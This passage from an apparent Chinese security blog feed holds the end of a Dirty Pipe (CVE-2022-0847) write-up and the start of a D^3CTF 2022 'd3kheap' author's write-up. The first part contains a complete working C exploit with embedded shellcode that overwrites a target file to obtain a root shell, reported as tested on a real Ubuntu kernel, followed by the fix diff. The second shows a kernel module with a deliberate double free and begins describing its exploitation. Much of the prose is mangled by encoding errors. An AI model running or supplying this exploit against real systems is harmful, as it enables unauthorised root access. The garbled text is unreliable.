class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> shellcode_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br><span class="hljs-type">long</span>page_size;<br><span class="hljs-type">size_t</span>offset_in_file;<br><span class="hljs-type">size_t</span> data_size;<br><span class="hljs-type">int</span> target_file_fd;<br><span class="hljs-type">int</span>pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_size;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">int</span> retval;<br><br><span class="hljs-comment">// checking before we start to exploit</span><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Usage: ./exp target_file&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br>page_size = sysconf(_SC_PAGE_SIZE);<br>offset_in_file = <span class="hljs-number">1</span>;<br><br>target_file_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (target_file_fd &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Failed to open the target file!&quot;</span>);<br><br><span class="hljs-comment">// exploit now...</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span><br><span class="hljs-comment"> * Just write and read through</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);<br>pipe(pipe_fd);<br>pipe_size = fcntl(pipe_fd[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>buffer = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(page_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;<br>size_left -= write(pipe_fd[<span class="hljs-number">1</span>], buffer, per_write);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;<br>size_left -= read(pipe_fd[<span class="hljs-number">0</span>], buffer, per_read);<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use the splice to make the pipe_buffer-&gt;page</span><br><span class="hljs-comment"> * become the page of the file mapped, by read</span><br><span class="hljs-comment"> * a byte from the file accross the splice</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);<br>offset_in_file--;<span class="hljs-comment">// we read a byte, so offset should minus 1</span><br>retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;splice failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;short splice!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Now it comes to the time of exploit:</span><br><span class="hljs-comment"> * the mapped page of file has been in pipe_buffer,</span><br><span class="hljs-comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span><br><span class="hljs-comment"> * just a simple write can make the exploit.</span><br><span class="hljs-comment"> */</span><br>retval = write(pipe_fd[<span class="hljs-number">1</span>], &amp;shellcode[<span class="hljs-number">1</span>], shellcode_len);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Write failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval &lt; shellcode_len)<br>errExit(<span class="hljs-string">&quot;Short write!&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Trigger root shell...\033[0m&quot;</span>);<br>system(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ Ubuntu 21.10 ã€å†…æ ¸ç‰ˆæœ¬ <code>5.13.0-28</code>  ä¸Šæµ‹è¯•çš„ç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸå®Œæˆææƒï¼š</p><p><img src="https://s2.loli.net/2022/03/12/P2QdeIqbASfuxHR.png" alt="image.png"></p><h1>0x04.æ¼æ´ä¿®å¤</h1><p>æ¼æ´çš„ä¿®å¤æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦åœ¨å¯¹åº”çš„æ¶‰åŠåˆ° <code>pipe_buffer-&gt;flags</code> çš„ä»£ç æ·»åŠ ä¸Šå°† flag ç½® 0 çš„ä»£ç å³å¯ï¼Œé™¤äº† <code>copy_page_to_iter_pipe</code> ä»¥å¤–åœ¨ <code>push_pipe</code> ä¸­ä¹Ÿç¼ºå¤±äº†ç½® 0 çš„ä»£ç ï¼Œè¡¥å……ä¸Šå³å¯ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/lib/iov_iter.c b/lib/iov_iter.c</span><br><span class="hljs-comment">index b0e0acdf96c1..6dd5330f7a99 100644</span><br><span class="hljs-comment">--- a/lib/iov_iter.c</span><br><span class="hljs-comment">+++ b/lib/iov_iter.c</span><br><span class="hljs-meta">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by<br> return 0;<br> <br> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-addition">+buf-&gt;flags = 0;</span><br> get_page(page);<br> buf-&gt;page = page;<br> buf-&gt;offset = offset;<br><span class="hljs-meta">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,<br> break;<br> <br> buf-&gt;ops = &amp;default_pipe_buf_ops;<br><span class="hljs-addition">+buf-&gt;flags = 0;</span><br> buf-&gt;page = page;<br> buf-&gt;offset = 0;<br> buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);<br></code></pre></td></tr></table></figure><blockquote><p>å‚è§<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">linux-kernel.vger.kernel.org archive mirror</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘è¶…ï¼Œç®¡äººç—´ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x06ã€‘D^ 3CTF2022 d3kheap å‡ºé¢˜æ‰‹è®°</title>
    <link href="http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/"/>
    <id>http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</id>
    <published>2022-03-08T10:25:07.000Z</published>
    <updated>2023-02-09T08:09:12.450Z</updated>
    
    <content type="html"><![CDATA[<p>å¬è¯´ sb å‡ºé¢˜äººæŠŠ exp ä¹Ÿç»™æ‰“åŒ…å‘å¸ƒäº†ï¼Œæ¯”èµ›ç»“æŸæ‰å‘ç°</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬é¢˜çš„åŸå‹æ¥è‡ªäºç¬”è€…å¤§ä¸‰ä¸Šå­¦æœŸé¢è¯•å›½å†…æŸå®‰å…¨å¤§å‚æ—¶çš„ä¸€é“é¢è¯•é¢˜ï¼Œå½“æ—¶çš„é—®é¢˜æ˜¯ï¼š</p><ul><li>â€œåœ¨ä¿æŠ¤å…¨å¼€çš„æƒ…å†µä¸‹è‹¥æ˜¯ç»™ä½ ä¸€ä¸ªå†…æ ¸ç©ºé—´ä¸­çš„ double freeï¼Œå¤§å°ä¸ºâ–ˆâ–ˆâ–ˆï¼Œä½ è¯¥æ€æ ·å»åˆ©ç”¨ï¼Ÿâ€</li></ul><p>ç¬”è€…åœ¨å½“æ—¶å¹¶æœªç­”å‡ºä¸€ä¸ªä»¤é¢è¯•å®˜è¾ƒä¸ºæ»¡æ„çš„ç­”æ¡ˆï¼Œä¹‹åç¬”è€…é‡æ–°æ€è€ƒï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ª<strong>ååˆ†æœ‰æ„æ€</strong>çš„é—®é¢˜ï¼šè¿™ååˆ†è´´è¿‘äºç°å®å†…æ ¸æ¼æ´çš„æŠ½è±¡æ¨¡å‹ä¹‹ä¸€ã€‚</p><p>ç›¸æ¯”äº CTF ä¸­ pwn é¢˜æ‰€ç»™äºˆçš„â€œä¼˜è¶Šâ€çš„ç¯å¢ƒï¼Œç°å®ä¸­çš„æ¼æ´å¾€å¾€å°±<strong>åªæ˜¯</strong>ä¸€ä¸ªå¼•ç”¨è®¡æ•°é”™è¯¯å¯¼è‡´çš„ double freeã€ä¸€ä¸ªæº¢å‡ºï¼ˆå¯èƒ½åªæ˜¯ä¸€ä¸ª <code>\0</code> å­—èŠ‚ï¼‰ã€ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆå¯¼è‡´çš„ UAFâ€¦åœ¨è¿™ç§æ¼æ´ç¯å¢ƒå½“ä¸­ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰â€œå‡ºé¢˜äººâ€ç»™äºˆæˆ‘ä»¬çš„â€œèœå•å †â€çš„å„ç§åŠŸèƒ½</p><p>å› æ­¤ï¼Œåœ¨è¿™æ ·â€œæ¶åŠ£â€çš„æ¼æ´ç¯å¢ƒä¹‹ä¸‹ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…ä»…å¯„å¸Œæœ›äºè¿™ä¸ªæ¼æ´æœ‰ä¸€ä¸ªè¾ƒå¥½çš„å“ç›¸ã€æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸åŸºå€åˆèƒ½å¸®æˆ‘ä»¬åŠ«æŒæ§åˆ¶æµï¼Œè€Œåº”å½“æ›´å¤šåœ°<strong>å€ŸåŠ©å†…æ ¸æœ¬èº«æä¾›ç»™æˆ‘ä»¬çš„å·¥å…·</strong>ï¼Œä»¥å¯»æ±‚æ›´ä¸º<strong>é€šç”¨</strong>çš„è§£æ³•</p><p>å¦‚ä½•å¯»æ±‚æ›´ä¸ºé€šç”¨çš„è§£æ³•ï¼Ÿå¤§å®¶éƒ½çŸ¥é“å¯¹äºç”¨æˆ·æ€çš„ glibc å †é¢˜è€Œè¨€æˆ‘ä»¬å¾€å¾€æœ‰ç€ä¸€ç§é€šç”¨è§£æ³•â€”â€”å°†æ¼æ´è½¬ä¸º UAFã€‚æ— è®ºæ˜¯ overlapping ã€double freeã€overflowâ€¦æœ€ç»ˆæˆ‘ä»¬éƒ½å¯ä»¥é€šè¿‡å°†å…¶è½¬åŒ–ä¸º UAF å®Œæˆåˆ©ç”¨ï¼Œè¿™ä¸ªæ³•åˆ™å¯¹äºâ€œå†…æ ¸å †â€è€Œè¨€åŒæ ·æœ‰æ•ˆ</p><p>åŸºäºè¿™ç§æ€æƒ³ï¼Œå¯¹äºå†…æ ¸ä¸­çš„ double freeã€å †æº¢å‡ºç­‰æ¼æ´ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æƒ³æ–¹æ³•å°†å…¶åŒ–ä¸º UAFï¼Œä¹‹åå†é€šè¿‡é€šç”¨çš„è§£æ³•å®Œæˆè§£é¢˜â€”â€”<strong>æœ¬é¢˜ä¾¿æ˜¯ç¬”è€…å¯¹äºåœ¨å†…æ ¸æ¼æ´åˆ©ç”¨çš„ UAF é˜¶æ®µä¹‹åé€šç”¨çš„è§£æ³•çš„ä¸€ä¸ªæ¢ç´¢ä¸å°è¯•</strong></p><h1>0x01.é¢˜ç›®åˆ†æ</h1><p>ç¬”è€…åœ¨ <a href="http://README.md">README.md</a> ä¸­é¢å¤–è¯´æ˜äº†å†…æ ¸çš„å¦‚ä¸‹ç¼–è¯‘é€‰é¡¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER</span>=y<br><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER_PATH</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">CONFIG_SLUB</span>=y<br><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>=y<br><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span>=y<br><span class="hljs-attr">CONFIG_HARDENED_USERCOPY</span>=y<br></code></pre></td></tr></table></figure><p>å³é™¤äº† FG-KASLR ä»¥å¤–å¤§éƒ¨åˆ†ä¸»æµçš„ä¿æŠ¤éƒ½å¼€å¯äº†</p><p>å› ä¸ºç¬”è€…æ›´å¸Œæœ›å¤§å®¶èƒ½å¤Ÿå…³æ³¨äºæ¼æ´åˆ©ç”¨ä¸Šï¼Œå› æ­¤é¢˜ç›®æœ¬èº«çš„é€»è¾‘ååˆ†ç®€å•ï¼Œåªæä¾›äº†ä¸€ä¸ª ioctl â€œèœå•â€ï¼Œ<strong>æœ‰æ•ˆçš„åŠŸèƒ½åªæœ‰åˆ†é…ä¸é‡Šæ”¾ buf</strong>ï¼Œåˆ†é…çš„å¤§å°ä¸º 1024</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kheap_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    spin_lock(&amp;spin);<br><br>    <span class="hljs-keyword">switch</span> (cmd)<br>    &#123;<br>        <span class="hljs-keyword">case</span> OBJ_ADD:<br>                <span class="hljs-keyword">if</span> (buf)<br>                &#123;<br>                    printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] You already had a buffer!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                buf = kmalloc(<span class="hljs-number">1024</span>, GFP_KERNEL);<br>                ref_count++;<br>                printk(KERN_INFO <span class="hljs-string">&quot;[d3kheap:] Alloc done.\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> OBJ_EDIT:<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> OBJ_SHOW:<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> OBJ_DEL:<br>                <span class="hljs-keyword">if</span> (!buf)<br>                &#123;<br>                    printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] You don\&#x27;t had a buffer!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!ref_count)<br>                &#123;<br>                    printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] The buf already free!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ref_count--;<br>                kfree(buf);<br>                printk(KERN_INFO <span class="hljs-string">&quot;[d3kheap:] Free done.\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] Invalid instructions.\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    spin_unlock(&amp;spin);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶‰åŠåˆ°çš„ä¸¤ä¸ªå…¨å±€å˜é‡åˆå§‹å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *buf = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> ref_count = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>æ ¹æ® ioctl çš„é€»è¾‘ï¼Œå½“æˆ‘ä»¬åˆ†é…äº†ä¸€ä¸ª object ä¹‹å <strong>ioctl çš„åˆ†é…åŠŸèƒ½å°±æ— æ•ˆäº†</strong>ï¼Œè€Œæ¯å½“æˆ‘ä»¬è¿›è¡Œä¸€æ¬¡é‡Šæ”¾ï¼Œ<code>ref_count</code> ä¾¿ä¼šå‡ä¸€ï¼Œå½“å…¶ä¸º 0 æ—¶ <strong>ioctl çš„é‡Šæ”¾åŠŸèƒ½ä¹Ÿè¢«æ— æ•ˆåŒ–</strong></p><p>æ¼æ´ç‚¹å¾ˆæ˜æ˜¾ï¼Œå¯¹ <code>ref_count</code> çš„é”™è¯¯åˆå§‹åŒ–å¯¼è‡´æˆ‘ä»¬å¯ä»¥é‡Šæ”¾ buf ä¸¤æ¬¡ï¼Œå³è¯¥æ¨¡å—<strong>åªæä¾›ç»™ä½ ä¸‰æ¬¡æ“ä½œæœºä¼šï¼Œä¸€æ¬¡åˆ†é…ï¼Œä¸¤æ¬¡é‡Šæ”¾ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡æ¼æ´æ¨¡å—å¯¹ buf è¿›è¡Œä»»ä½•é¢å¤–çš„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚è¯»/å†™ï¼‰ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯â€”â€”â€œç»™ä½ ä¸€æ¬¡å†…æ ¸ç©ºé—´ä¸­å¤§å°ä¸º 1024 çš„ object çš„ double free çš„æœºä¼šï¼Œä¿æŠ¤å…¨å¼€ï¼Œä½ è¯¥å¦‚ä½•å»åˆ©ç”¨ï¼Ÿâ€</p><h1>0x02.æ¼æ´åˆ©ç”¨</h1><p>å› ä¸ºåœ¨ slub_free ä¸­æœ‰ç€å¯¹ double free çš„ç®€å•æ£€æŸ¥ï¼ˆç±»ä¼¼äº glibc ä¸­çš„ fastbinï¼Œä¼šæ£€æŸ¥ freelist æŒ‡å‘çš„ç¬¬ä¸€ä¸ª objectï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥è¿›è¡Œ double freeï¼Œè€Œåº”è¯¥å°†å…¶è½¬åŒ–ä¸º UAF è¿›è¡Œåˆ©ç”¨</p><h2 id="æ„é€ -UAF">æ„é€  UAF</h2><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦æ„é€ ä¸€ä¸ª UAFï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¦‚ä¸‹åˆ©ç”¨é“¾ï¼š</p><ul><li>åˆ†é…ä¸€ä¸ª 1024 å¤§å°çš„ object</li><li>é‡Šæ”¾è¯¥ object</li><li>å°†å…¶åˆ†é…åˆ°åˆ«çš„ç»“æ„ä½“ï¼ˆvictimï¼‰ä¸Š</li><li>é‡Šæ”¾è¯¥ object</li></ul><p>æ­¤æ—¶ victim è™½ç„¶è¿˜å¤„åœ¨ä½¿ç”¨é˜¶æ®µï¼Œä½†æ˜¯<strong>åœ¨ slub ä¸­å…¶åŒæ—¶ä¹Ÿè¢«è§†ä¸ºä¸€ä¸ª free object</strong>ï¼Œæˆ‘ä»¬æ­¤æ—¶ä¾¿å®Œæˆäº† UAF çš„æ„é€ ï¼Œç”±äº slub éµå¾ª LIFOï¼Œå› æ­¤æ¥ä¸‹æ¥åˆ†é…çš„ç¬¬ä¸€ä¸ªå¤§å°ä¸º 1024 çš„ object <strong>ä¾¿ä¼šæ˜¯ victim</strong></p><p>æ¥ä¸‹æ¥æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯ç¬”è€…æœ€åˆæƒ³åˆ°çš„æ¯”è¾ƒç¬¨é‡çš„å†…å­˜æœç´¢è§£æ³•ï¼Œå¦ä¸€ç§æ˜¯åŸºäº Google åœ¨ CVE-2021-22555 ä¸­ç»™å‡ºçš„é€šç”¨ UAF è§£æ³•</p><h2 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨-setxattr-å¤šæ¬¡åŠ«æŒ-msg-msg">è§£æ³•ä¸€ï¼šåˆ©ç”¨ setxattr å¤šæ¬¡åŠ«æŒ msg_msg</h2><h3 id="Step-I-setxattr-ä¿®æ”¹-object-å†…å®¹">Step.I setxattr ä¿®æ”¹ object å†…å®¹</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ€è€ƒå¦‚ä½•å¯¹ä¸€ä¸ª free çŠ¶æ€çš„ object å†…å†™å…¥æ•°æ®ï¼Œè¿™é‡Œç¬”è€…è¦å‘å¤§å®¶ä»‹ç»ä¸€ä¸ªåä¸º setxattr çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¯¹å†…æ ¸å®‰å…¨ç¨æœ‰ç ”ç©¶çš„åŒå­¦åº”è¯¥éƒ½æ¥è§¦è¿‡ï¼‰</p><p>setxattr æ˜¯ä¸€ä¸ªååˆ†ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨æ—ï¼ŒæŠ›å¼€å…¶æœ¬èº«çš„åŠŸèƒ½ï¼Œåœ¨ kernel çš„åˆ©ç”¨å½“ä¸­ä»–å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›<strong>è¿‘ä¹ä»»æ„å¤§å°çš„å†…æ ¸ç©ºé—´ object åˆ†é…</strong></p><p>è§‚å¯Ÿ setxattr æºç ï¼Œå‘ç°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>setxattr()</code> å‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ value å’Œ size éƒ½æ˜¯ç”±æˆ‘ä»¬æ¥æŒ‡å®šçš„ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ object å¹¶å‘å…¶ä¸­å†™å…¥å†…å®¹</strong>ï¼Œå®Œæˆå†™å…¥ä¹‹åè¯¥ object åˆä¼šé€šè¿‡ kvfree è¢«é‡Šæ”¾æ‰ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ setxattr <strong>å¤šæ¬¡ä¿®æ”¹ victim çš„å†…å®¹</strong></p><p>ä¸å¤Ÿå®Œç¾çš„ä¸€ç‚¹æ˜¯ï¼Œslub ä¸­ free çš„ object åŒæ ·æ˜¯è¿æ¥æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•æ§åˆ¶è¯¥ object ä¸­ <code>kmem_cache-&gt;offset</code> åç§»å¤„çš„ 8 å­—èŠ‚çš„å†…å®¹ï¼Œä½†è¿™ä¸ª offset çš„å­˜åœ¨<strong>ä¹Ÿä»å¦ä¸€ä¸ªä¾§é¢æä¾›ç»™äº†æˆ‘ä»¬ä¾¿åˆ©</strong>ï¼Œåœ¨æ¥ä¸‹æ¥çš„åˆ©ç”¨ä¸­ä½ ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹</p><p>å¯èƒ½æœ‰çš„äººè¿˜ä¼šæƒ³åˆ° userfaultfd + setxattr è¿™ä¸€æŠ€æœ¯ï¼Œæˆ–è®¸å¯ä»¥åˆ©ç”¨è¿™ä¸ªæŠ€æœ¯åŠ«æŒ freelist å®Œæˆä»»æ„åœ°å€åˆ†é…ä¸ä»»æ„åœ°å€å†™ï¼Ÿä½†æ˜¯<strong>è‡ªä»å†…æ ¸ç‰ˆæœ¬ 5.11 èµ·ï¼Œuserfaultfd è¢«é™åˆ¶ä¸ºé»˜è®¤æƒ…å†µä¸‹åªæœ‰ root æƒé™æ‰èƒ½ä½¿ç”¨</strong>ï¼Œå› 